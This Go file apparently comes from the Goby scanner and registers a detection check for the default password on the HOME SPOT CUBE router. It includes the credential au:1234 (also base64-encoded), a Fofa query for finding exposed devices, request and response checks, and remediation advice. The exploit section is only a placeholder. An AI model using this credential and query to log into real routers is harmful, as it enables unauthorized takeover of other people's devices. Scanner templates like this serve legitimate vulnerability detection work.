package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "HOME SPOT CUBE Router Default Password",
    "Description": "<p>HOME SPOT CUBE router default password, the attacker can use the default password to log in to the router device, check the system status, modify the device configuration, and affect the user's use.</p>",
    "Product": "HOME SPOT CUBE",
    "Homepage": "https://www.au.com/support/service/mobile/guide/wlan/home_spot_cube/",
    "DisclosureDate": "2019-08-06",
    "PostTime": "2024-07-19",
    "Author": "460761114@qq.com",
    "FofaQuery": "body=\"Document Error: Unauthorized\" && body=\"1234\"",
    "GobyQuery": "body=\"Document Error: Unauthorized\" && body=\"1234\"",
    "Level": "2",
    "Impact": "<p>An attacker can use the au:1234 passphrase to log in to the device, view the network status, modify the network configuration, device configuration and other system configurations, and even control the entire device.</p>",
    "Recommendation": "<p>1. Modify the default password, which should preferably contain upper- and lower-case letters, numbers and special characters, etc., and the number of digits is greater than 8; </p><p>2, if not necessary, prohibit the public network access to the device; </p><p>3、Whitelist to restrict the accessible IP.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {
                    "Authorization": "Basic YXU6MTIzNA=="
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "home.asp",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "home.asp",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|define|variable|{{{scheme}}}://au:1234@{{{hostinfo}}}"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "401",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "HOME SPOT CUBE路由器默认口令",
            "Product": "HOME SPOT CUBE",
            "Description": "<p>HOME SPOT CUBE路由器默认口令，攻击者可利用默认口令登录路由器设备，查看系统状态，修改设备配置，影响用户使用。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等且位数大于8位；<br></p><p>2、如非必要，禁止公网访问该设备；<br></p><p>3、白名单限制可访问IP。<br></p>",
            "Impact": "<p>攻击者可利用au：1234口令登录该设备，查看网络状态，修改网络配置，设备配置等系统配置，甚至控制整个设备。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "HOME SPOT CUBE Router Default Password",
            "Product": "HOME SPOT CUBE",
            "Description": "<p>HOME SPOT CUBE router default password, the attacker can use the default password to log in to the router device, check the system status, modify the device configuration, and affect the user's use.<br></p>",
            "Recommendation": "<p>1. Modify the default password, which should preferably contain upper- and lower-case letters, numbers and special characters, etc., and the number of digits is greater than 8;&nbsp;</p><p>2, if not necessary, prohibit the public network access to the device;&nbsp;</p><p>3、Whitelist to restrict the accessible IP.<br></p>",
            "Impact": "<p>An attacker can use the au:1234 passphrase to log in to the device, view the network status, modify the network configuration, device configuration and other system configurations, and even control the entire device.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10978"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
